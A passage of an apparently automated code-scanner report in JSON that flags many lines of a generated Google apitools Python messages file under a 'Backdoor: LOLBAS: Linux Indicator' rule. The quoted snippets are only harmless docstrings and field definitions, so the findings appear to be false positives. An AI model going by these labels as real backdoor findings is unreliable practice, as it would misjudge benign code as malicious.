                      "markdown": "`      PatchServiceConfig method instead to do partial updates.\n  \"\"\"\n\n  service = _messages.MessageField('Service', 1)\n  serviceName = _messages.StringField(2, required=True)\n  updateMask = _messages.StringField(3)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2936,
                  "startColumn": 39,
                  "endLine": 2936,
                  "endColumn": 48,
                  "snippet": {
                    "text": "    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n    updateMask: A mask specifying which fields to update. Update mask has been\n      deprecated on UpdateServiceConfig service method. Please use\n      PatchServiceConfig method instead to do partial updates.\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n    updateMask: A mask specifying which fields to update. Update mask has been\n      deprecated on UpdateServiceConfig service method. Please use\n      PatchServiceConfig method instead to do partial updates.\n  \"\"\"\n\n",
                      "markdown": "`    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n    updateMask: A mask specifying which fields to update. Update mask has been\n      deprecated on UpdateServiceConfig service method. Please use\n      PatchServiceConfig method instead to do partial updates.\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2932,
                  "startColumn": 14,
                  "endLine": 2932,
                  "endColumn": 23,
                  "snippet": {
                    "text": "  r\"\"\"A ServicemanagementServicesUpdateConfigRequest object.\n\n  Fields:\n    service: A Service resource to be passed as the request body.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n    updateMask: A mask specifying which fields to update. Update mask has been\n",
                    "rendered": {
                      "text": "  r\"\"\"A ServicemanagementServicesUpdateConfigRequest object.\n\n  Fields:\n    service: A Service resource to be passed as the request body.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n    updateMask: A mask specifying which fields to update. Update mask has been\n",
                      "markdown": "`  r\"\"\"A ServicemanagementServicesUpdateConfigRequest object.\n\n  Fields:\n    service: A Service resource to be passed as the request body.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n    updateMask: A mask specifying which fields to update. Update mask has been\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2905,
                  "startColumn": 1,
                  "endLine": 2905,
                  "endColumn": 9,
                  "snippet": {
                    "text": "    ALL = 3\n\n  consumerProjectId = _messages.StringField(1, required=True)\n  expand = _messages.StringField(2)\n  serviceName = _messages.StringField(3, required=True)\n  view = _messages.EnumField('ViewValueValuesEnum', 4)\n\n",
                    "rendered": {
                      "text": "    ALL = 3\n\n  consumerProjectId = _messages.StringField(1, required=True)\n  expand = _messages.StringField(2)\n  serviceName = _messages.StringField(3, required=True)\n  view = _messages.EnumField('ViewValueValuesEnum', 4)\n\n",
                      "markdown": "`    ALL = 3\n\n  consumerProjectId = _messages.StringField(1, required=True)\n  expand = _messages.StringField(2)\n  serviceName = _messages.StringField(3, required=True)\n  view = _messages.EnumField('ViewValueValuesEnum', 4)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2883,
                  "startColumn": 21,
                  "endLine": 2883,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n  Fields:\n    consumerProjectId: The project ID of the consumer.\n    expand: Fields to expand in any results.  By default, the following fields\n      are not present in the result: - `operations` - `quota_usage`\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n",
                    "rendered": {
                      "text": "\n  Fields:\n    consumerProjectId: The project ID of the consumer.\n    expand: Fields to expand in any results.  By default, the following fields\n      are not present in the result: - `operations` - `quota_usage`\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n",
                      "markdown": "`\n  Fields:\n    consumerProjectId: The project ID of the consumer.\n    expand: Fields to expand in any results.  By default, the following fields\n      are not present in the result: - `operations` - `quota_usage`\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2854,
                  "startColumn": 1,
                  "endLine": 2854,
                  "endColumn": 10,
                  "snippet": {
                    "text": "    updateMask: A mask specifying which fields to update.\n  \"\"\"\n\n  service = _messages.MessageField('Service', 1)\n  serviceName = _messages.StringField(2, required=True)\n  updateMask = _messages.StringField(3)\n\n",
                    "rendered": {
                      "text": "    updateMask: A mask specifying which fields to update.\n  \"\"\"\n\n  service = _messages.MessageField('Service', 1)\n  serviceName = _messages.StringField(2, required=True)\n  updateMask = _messages.StringField(3)\n\n",
                      "markdown": "`    updateMask: A mask specifying which fields to update.\n  \"\"\"\n\n  service = _messages.MessageField('Service', 1)\n  serviceName = _messages.StringField(2, required=True)\n  updateMask = _messages.StringField(3)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2848,
                  "startColumn": 14,
                  "endLine": 2848,
                  "endColumn": 23,
                  "snippet": {
                    "text": "  r\"\"\"A ServicemanagementServicesPatchConfigRequest object.\n\n  Fields:\n    service: A Service resource to be passed as the request body.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n    updateMask: A mask specifying which fields to update.\n",
                    "rendered": {
                      "text": "  r\"\"\"A ServicemanagementServicesPatchConfigRequest object.\n\n  Fields:\n    service: A Service resource to be passed as the request body.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n    updateMask: A mask specifying which fields to update.\n",
                      "markdown": "`  r\"\"\"A ServicemanagementServicesPatchConfigRequest object.\n\n  Fields:\n    service: A Service resource to be passed as the request body.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n    updateMask: A mask specifying which fields to update.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2838,
                  "startColumn": 1,
                  "endLine": 2838,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\n  category = _messages.StringField(1)\n  consumerProjectId = _messages.StringField(2)\n  expand = _messages.StringField(3)\n  pageSize = _messages.IntegerField(4, variant=_messages.Variant.INT32)\n  pageToken = _messages.StringField(5)\n  producerProjectId = _messages.StringField(6)\n",
                    "rendered": {
                      "text": "\n  category = _messages.StringField(1)\n  consumerProjectId = _messages.StringField(2)\n  expand = _messages.StringField(3)\n  pageSize = _messages.IntegerField(4, variant=_messages.Variant.INT32)\n  pageToken = _messages.StringField(5)\n  producerProjectId = _messages.StringField(6)\n",
                      "markdown": "`\n  category = _messages.StringField(1)\n  consumerProjectId = _messages.StringField(2)\n  expand = _messages.StringField(3)\n  pageSize = _messages.IntegerField(4, variant=_messages.Variant.INT32)\n  pageToken = _messages.StringField(5)\n  producerProjectId = _messages.StringField(6)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2826,
                  "startColumn": 21,
                  "endLine": 2826,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    consumerProjectId: Include services consumed by the specified project.  If\n      project_settings is expanded, then this field controls which project\n      project_settings is populated for.\n    expand: Fields to expand in any results.  By default, the following fields\n      are not fully included in list results: - `operations` -\n      `project_settings` - `project_settings.operations` - `quota_usage` (It\n      requires `project_settings`)\n",
                    "rendered": {
                      "text": "    consumerProjectId: Include services consumed by the specified project.  If\n      project_settings is expanded, then this field controls which project\n      project_settings is populated for.\n    expand: Fields to expand in any results.  By default, the following fields\n      are not fully included in list results: - `operations` -\n      `project_settings` - `project_settings.operations` - `quota_usage` (It\n      requires `project_settings`)\n",
                      "markdown": "`    consumerProjectId: Include services consumed by the specified project.  If\n      project_settings is expanded, then this field controls which project\n      project_settings is populated for.\n    expand: Fields to expand in any results.  By default, the following fields\n      are not fully included in list results: - `operations` -\n      `project_settings` - `project_settings.operations` - `quota_usage` (It\n      requires `project_settings`)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2811,
                  "startColumn": 1,
                  "endLine": 2811,
                  "endColumn": 9,
                  "snippet": {
                    "text": "    ALL = 3\n\n  consumerProjectId = _messages.StringField(1)\n  expand = _messages.StringField(2)\n  serviceName = _messages.StringField(3, required=True)\n  view = _messages.EnumField('ViewValueValuesEnum', 4)\n\n",
                    "rendered": {
                      "text": "    ALL = 3\n\n  consumerProjectId = _messages.StringField(1)\n  expand = _messages.StringField(2)\n  serviceName = _messages.StringField(3, required=True)\n  view = _messages.EnumField('ViewValueValuesEnum', 4)\n\n",
                      "markdown": "`    ALL = 3\n\n  consumerProjectId = _messages.StringField(1)\n  expand = _messages.StringField(2)\n  serviceName = _messages.StringField(3, required=True)\n  view = _messages.EnumField('ViewValueValuesEnum', 4)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2784,
                  "startColumn": 21,
                  "endLine": 2784,
                  "endColumn": 29,
                  "snippet": {
                    "text": "  Fields:\n    consumerProjectId: If project_settings is expanded, return settings for\n      the specified consumer project.\n    expand: Fields to expand in any results.  By default, the following fields\n      are not present in the result: - `operations` - `project_settings` -\n      `project_settings.operations` - `quota_usage` (It requires\n      `project_settings`) - `historical_quota_usage` (It requires\n",
                    "rendered": {
                      "text": "  Fields:\n    consumerProjectId: If project_settings is expanded, return settings for\n      the specified consumer project.\n    expand: Fields to expand in any results.  By default, the following fields\n      are not present in the result: - `operations` - `project_settings` -\n      `project_settings.operations` - `quota_usage` (It requires\n      `project_settings`) - `historical_quota_usage` (It requires\n",
                      "markdown": "`  Fields:\n    consumerProjectId: If project_settings is expanded, return settings for\n      the specified consumer project.\n    expand: Fields to expand in any results.  By default, the following fields\n      are not present in the result: - `operations` - `project_settings` -\n      `project_settings.operations` - `quota_usage` (It requires\n      `project_settings`) - `historical_quota_usage` (It requires\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2764,
                  "startColumn": 27,
                  "endLine": 2764,
                  "endColumn": 36,
                  "snippet": {
                    "text": "  r\"\"\"A ServicemanagementServicesGetConfigRequest object.\n\n  Fields:\n    configId: The id of the service config resource. Optional. If it is not\n      specified, the latest version of config will be returned.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n",
                    "rendered": {
                      "text": "  r\"\"\"A ServicemanagementServicesGetConfigRequest object.\n\n  Fields:\n    configId: The id of the service config resource. Optional. If it is not\n      specified, the latest version of config will be returned.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n",
                      "markdown": "`  r\"\"\"A ServicemanagementServicesGetConfigRequest object.\n\n  Fields:\n    configId: The id of the service config resource. Optional. If it is not\n      specified, the latest version of config will be returned.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2741,
                  "startColumn": 69,
                  "endLine": 2742,
                  "snippet": {
                    "text": "  Fields:\n    enableServiceRequest: A EnableServiceRequest resource to be passed as the\n      request body.\n    serviceName: Name of the service to enable. Specifying an unknown service\n      name will cause the request to fail.\n  \"\"\"\n\n  enableServiceRequest = _messages.MessageField('EnableServiceRequest', 1)\n",
                    "rendered": {
                      "text": "  Fields:\n    enableServiceRequest: A EnableServiceRequest resource to be passed as the\n      request body.\n    serviceName: Name of the service to enable. Specifying an unknown service\n      name will cause the request to fail.\n  \"\"\"\n\n  enableServiceRequest = _messages.MessageField('EnableServiceRequest', 1)\n",
                      "markdown": "`  Fields:\n    enableServiceRequest: A EnableServiceRequest resource to be passed as the\n      request body.\n    serviceName: Name of the service to enable. Specifying an unknown service\n      name will cause the request to fail.\n  \"\"\"\n\n  enableServiceRequest = _messages.MessageField('EnableServiceRequest', 1)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2741,
                  "startColumn": 28,
                  "endLine": 2741,
                  "endColumn": 37,
                  "snippet": {
                    "text": "  Fields:\n    enableServiceRequest: A EnableServiceRequest resource to be passed as the\n      request body.\n    serviceName: Name of the service to enable. Specifying an unknown service\n      name will cause the request to fail.\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "  Fields:\n    enableServiceRequest: A EnableServiceRequest resource to be passed as the\n      request body.\n    serviceName: Name of the service to enable. Specifying an unknown service\n      name will cause the request to fail.\n  \"\"\"\n\n",
                      "markdown": "`  Fields:\n    enableServiceRequest: A EnableServiceRequest resource to be passed as the\n      request body.\n    serviceName: Name of the service to enable. Specifying an unknown service\n      name will cause the request to fail.\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2727,
                  "startColumn": 70,
                  "endLine": 2728,
                  "snippet": {
                    "text": "  Fields:\n    disableServiceRequest: A DisableServiceRequest resource to be passed as\n      the request body.\n    serviceName: Name of the service to disable. Specifying an unknown service\n      name will cause the request to fail.\n  \"\"\"\n\n  disableServiceRequest = _messages.MessageField('DisableServiceRequest', 1)\n",
                    "rendered": {
                      "text": "  Fields:\n    disableServiceRequest: A DisableServiceRequest resource to be passed as\n      the request body.\n    serviceName: Name of the service to disable. Specifying an unknown service\n      name will cause the request to fail.\n  \"\"\"\n\n  disableServiceRequest = _messages.MessageField('DisableServiceRequest', 1)\n",
                      "markdown": "`  Fields:\n    disableServiceRequest: A DisableServiceRequest resource to be passed as\n      the request body.\n    serviceName: Name of the service to disable. Specifying an unknown service\n      name will cause the request to fail.\n  \"\"\"\n\n  disableServiceRequest = _messages.MessageField('DisableServiceRequest', 1)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2727,
                  "startColumn": 28,
                  "endLine": 2727,
                  "endColumn": 37,
                  "snippet": {
                    "text": "  Fields:\n    disableServiceRequest: A DisableServiceRequest resource to be passed as\n      the request body.\n    serviceName: Name of the service to disable. Specifying an unknown service\n      name will cause the request to fail.\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "  Fields:\n    disableServiceRequest: A DisableServiceRequest resource to be passed as\n      the request body.\n    serviceName: Name of the service to disable. Specifying an unknown service\n      name will cause the request to fail.\n  \"\"\"\n\n",
                      "markdown": "`  Fields:\n    disableServiceRequest: A DisableServiceRequest resource to be passed as\n      the request body.\n    serviceName: Name of the service to disable. Specifying an unknown service\n      name will cause the request to fail.\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2684,
                  "startColumn": 1,
                  "endLine": 2684,
                  "endColumn": 9,
                  "snippet": {
                    "text": "    ALL = 3\n\n  customerId = _messages.StringField(1, required=True)\n  expand = _messages.StringField(2)\n  serviceName = _messages.StringField(3, required=True)\n  view = _messages.EnumField('ViewValueValuesEnum', 4)\n\n",
                    "rendered": {
                      "text": "    ALL = 3\n\n  customerId = _messages.StringField(1, required=True)\n  expand = _messages.StringField(2)\n  serviceName = _messages.StringField(3, required=True)\n  view = _messages.EnumField('ViewValueValuesEnum', 4)\n\n",
                      "markdown": "`    ALL = 3\n\n  customerId = _messages.StringField(1, required=True)\n  expand = _messages.StringField(2)\n  serviceName = _messages.StringField(3, required=True)\n  view = _messages.EnumField('ViewValueValuesEnum', 4)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2662,
                  "startColumn": 21,
                  "endLine": 2662,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    customerId: ID for the customer. See the comment for\n      `CustomerSettings.customer_id` field of message for its format. This\n      field is required.\n    expand: Fields to expand in any results.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`. This\n      field is required.\n",
                    "rendered": {
                      "text": "    customerId: ID for the customer. See the comment for\n      `CustomerSettings.customer_id` field of message for its format. This\n      field is required.\n    expand: Fields to expand in any results.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`. This\n      field is required.\n",
                      "markdown": "`    customerId: ID for the customer. See the comment for\n      `CustomerSettings.customer_id` field of message for its format. This\n      field is required.\n    expand: Fields to expand in any results.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`. This\n      field is required.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2613,
                  "startColumn": 27,
                  "endLine": 2613,
                  "endColumn": 36,
                  "snippet": {
                    "text": "  r\"\"\"A ServicemanagementServicesConfigsGetRequest object.\n\n  Fields:\n    configId: The id of the service config resource. Optional. If it is not\n      specified, the latest version of config will be returned.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n",
                    "rendered": {
                      "text": "  r\"\"\"A ServicemanagementServicesConfigsGetRequest object.\n\n  Fields:\n    configId: The id of the service config resource. Optional. If it is not\n      specified, the latest version of config will be returned.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n",
                      "markdown": "`  r\"\"\"A ServicemanagementServicesConfigsGetRequest object.\n\n  Fields:\n    configId: The id of the service config resource. Optional. If it is not\n      specified, the latest version of config will be returned.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2605,
                  "startColumn": 1,
                  "endLine": 2605,
                  "endColumn": 10,
                  "snippet": {
                    "text": "      for naming requirements.  For example: `example.googleapis.com`.\n  \"\"\"\n\n  service = _messages.MessageField('Service', 1)\n  serviceName = _messages.StringField(2, required=True)\n\n\n",
                    "rendered": {
                      "text": "      for naming requirements.  For example: `example.googleapis.com`.\n  \"\"\"\n\n  service = _messages.MessageField('Service', 1)\n  serviceName = _messages.StringField(2, required=True)\n\n\n",
                      "markdown": "`      for naming requirements.  For example: `example.googleapis.com`.\n  \"\"\"\n\n  service = _messages.MessageField('Service', 1)\n  serviceName = _messages.StringField(2, required=True)\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2600,
                  "startColumn": 14,
                  "endLine": 2600,
                  "endColumn": 23,
                  "snippet": {
                    "text": "  r\"\"\"A ServicemanagementServicesConfigsCreateRequest object.\n\n  Fields:\n    service: A Service resource to be passed as the request body.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n  \"\"\"\n",
                    "rendered": {
                      "text": "  r\"\"\"A ServicemanagementServicesConfigsCreateRequest object.\n\n  Fields:\n    service: A Service resource to be passed as the request body.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n  \"\"\"\n",
                      "markdown": "`  r\"\"\"A ServicemanagementServicesConfigsCreateRequest object.\n\n  Fields:\n    service: A Service resource to be passed as the request body.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n  \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2588,
                  "startColumn": 20,
                  "endLine": 2588,
                  "endColumn": 29,
                  "snippet": {
                    "text": "  r\"\"\"A ServicemanagementServicesAccessPolicyQueryRequest object.\n\n  Fields:\n    serviceName: The service to query access for.\n    userEmail: The user to query access for.\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "  r\"\"\"A ServicemanagementServicesAccessPolicyQueryRequest object.\n\n  Fields:\n    serviceName: The service to query access for.\n    userEmail: The user to query access for.\n  \"\"\"\n\n",
                      "markdown": "`  r\"\"\"A ServicemanagementServicesAccessPolicyQueryRequest object.\n\n  Fields:\n    serviceName: The service to query access for.\n    userEmail: The user to query access for.\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
